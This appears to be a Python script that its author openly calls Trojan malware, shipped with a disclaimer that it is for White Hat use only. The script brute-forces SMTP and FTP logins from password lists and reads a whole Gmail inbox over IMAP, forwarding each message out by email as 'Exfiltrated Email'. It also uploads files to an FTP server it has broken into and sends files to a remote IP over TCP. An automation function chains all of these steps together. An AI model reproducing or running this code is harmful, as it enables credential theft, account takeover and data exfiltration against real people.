#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 7th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script automates various tasks including email exfiltration, brute force attacks, FTP operations,
# and file transmission. It utilizes various modules to perform tasks such as sending test emails, 
# extracting emails from a Gmail account, brute forcing FTP credentials, uploading files via FTP, 
# transmitting files over TCP/IP, and extracting files from directories recursively. The script is 
# designed to execute all tasks automatically, providing a streamlined approach to conducting various 
# dark operations without user intervention.
#################################################################################################
import os
import socket
import platform
from flask import Flask, request
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
import base64
import zlib
import smtplib
import imaplib
import time
import ftplib
import magic

app = Flask(__name__)  # Create a Flask application instance

# Global variables for SMTP server and account details
smtp_server = ""
smtp_port = 587
smtp_acct = ""
smtp_passwd = ""
tgt_accts = []

def plain_email(subject, contents):
    """
    Sends a plain text email.

    Args:
    subject (str): The subject of the email.
    contents (str): The body of the email.
    """
    message = f'Subject: {subject}\nFrom: {smtp_acct}\n'
    message += f'To: {", ".join(tgt_accts)}\n\n{contents}'

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_passwd)
    server.sendmail(smtp_acct, tgt_accts, message)

    time.sleep(1)
    server.quit()

def brute_force_password(email):
    """
    Brute forces passwords for a given email account.

    Args:
    email (str): The email address to brute force.

    Returns:
    str: The found password, if successful; otherwise, None.
    """
    passwords = ['password1', 'password2', 'password3']  # Add more passwords for brute force
    for password in passwords:
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(email, password)
            server.quit()
            return password
        except smtplib.SMTPAuthenticationError:
            continue
    return None

def exfiltrate_gmail(email, password):
    """
    Exfiltrates emails from a Gmail account.

    Args:
    email (str): The Gmail address.
    password (str): The password for the Gmail account.
    """
    imap_server = "imap.gmail.com"
    mail = imaplib.IMAP4_SSL(imap_server)
    mail.login(email, password)
    mail.select('inbox')

    result, data = mail.search(None, 'ALL')
    email_ids = data[0].split()

    for email_id in email_ids:
        result, data = mail.fetch(email_id, "(RFC822)")
        raw_email = data[0][1]
        plain_email('Exfiltrated Email', raw_email)

    mail.close()
    mail.logout()

def brute_force_ftp(username_dict_path, password_dict_path, ftp_server):
    """
    Brute forces FTP server using provided username and password dictionaries.

    Args:
    username_dict_path (str): Path to the file containing usernames.
    password_dict_path (str): Path to the file containing passwords.
    ftp_server (str): FTP server address.

    Returns:
    tuple: Username and password if successful, otherwise (None, None).
    """
    with open(username_dict_path) as users_file:
        usernames = users_file.read().splitlines()
    with open(password_dict_path) as passwords_file:
        passwords = passwords_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP(ftp_server)
                ftp.login(username, password)
                ftp.quit()
                return username, password
            except ftplib.error_perm:
                continue
    return None, None

def ftp_upload(docpath, server, username, password):
    """
    Function to upload a file to an FTP server.

    Args:
        docpath (str): Path to the file to be uploaded.
        server (str): FTP server address.
        username (str): FTP server username.
        password (str): FTP server password.
    """
    ftp = ftplib.FTP(server)
    ftp.login(username, password)
    ftp.cwd('/pub/')
    with open(docpath, "rb") as f:
        ftp.storbinary("STOR " + os.path.basename(docpath), f)
    ftp.quit()

def ftp_transmit(document_path, client_ip):
    """
    Function to transmit a file to a client via TCP/IP.

    Args:
        document_path (str): Path to the file to be transmitted.
        client_ip (str): IP address of the client.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_port = 10000
    try:
        client.connect((client_ip, client_port))
        with open(document_path, 'rb') as f:
            client.sendall(f.read())
        print("File transmitted successfully.")
    except Exception as e:
        print(f"Failed to transmit file: {e}")
    finally:
        client.close()

def extract_files(root_dir):
    """
    Function to extract files recursively from a directory.

    Args:
    root_dir (str): The root directory to start the extraction from.
    """
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            file_path = os.path.join(root, file)
            file_type = magic.from_file(file_path, mime=True)
            print(f"File: {file_path}, Type: {file_type}")

# Automated function to perform all tasks
def automate_all_tasks():
    # Example data, replace with your actual data
    email = "example@gmail.com"
    password = "example_password"
    ftp_server = "example.com"
    username_dict_path = "usernames.txt"
    password_dict_path = "passwords.txt"
    docpath = "example.txt"
    server = "ftp.example.com"
    username = "ftp_user"
    ftp_password = "ftp_password"
    client_ip = "client_ip_address"
    directory_path = "/path/to/directory"

    # Sending test email
    plain_email("Test Subject", "Test Content")

    # Exfiltrating emails from Gmail
    exfiltrate_gmail(email, password)

    # Brute forcing FTP server and uploading file
    username, password = brute_force_ftp(username_dict_path, password_dict_path, ftp_server)
    if username and password:
        ftp_upload(docpath, server, username, password)

    # Transmitting file to a client via TCP/IP
    ftp_transmit(docpath, client_ip)

    # Extracting files from a directory
    extract_files(directory_path)

# Execute all tasks automatically
if __name__ == '__main__':
    automate_all_tasks()

